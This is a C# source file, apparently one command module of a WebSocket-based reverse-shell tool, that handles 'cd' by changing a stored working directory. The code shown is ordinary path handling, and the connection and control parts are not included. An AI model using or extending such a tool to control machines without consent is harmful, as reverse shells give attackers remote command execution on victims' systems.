using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using WebSocketReverseShellDotNet.utils;

namespace WebSocketReverseShellDotNet.service.commands
{
    internal class ChangeDirectoryCommand : Command
    {
        public string ExecuteCommand(string command)
        {
            List<string> commands = new List<string>(DataManuplationUtil.StringToList(command, " "));

            // edge cases
            if (commands.Count > 0 && commands[0].Equals("cd", StringComparison.OrdinalIgnoreCase))
            {
                commands.RemoveAt(0);
                return ChangeDirectory(string.Join(" ", commands));
            }


            return "There is a problem with the command";
        }

        public static string ChangeDirectory(string path)
        {
            string relativeDirectoryPath = Path.Combine(SystemCommandUtil.CurrentWorkingDir.FullName, path);
            string absoluteDirectoryPath = path;

            if (Directory.Exists(relativeDirectoryPath))
            {
                SystemCommandUtil.CurrentWorkingDir = new DirectoryInfo(relativeDirectoryPath);
                return "Directory changed successfully";
            }
            else if (Directory.Exists(absoluteDirectoryPath))
            {
                SystemCommandUtil.CurrentWorkingDir = new DirectoryInfo(absoluteDirectoryPath);
                return "Directory changed successfully";
            }
            else
            {
                return "Directory not found: " + path;
            }
        }

    }




    
}
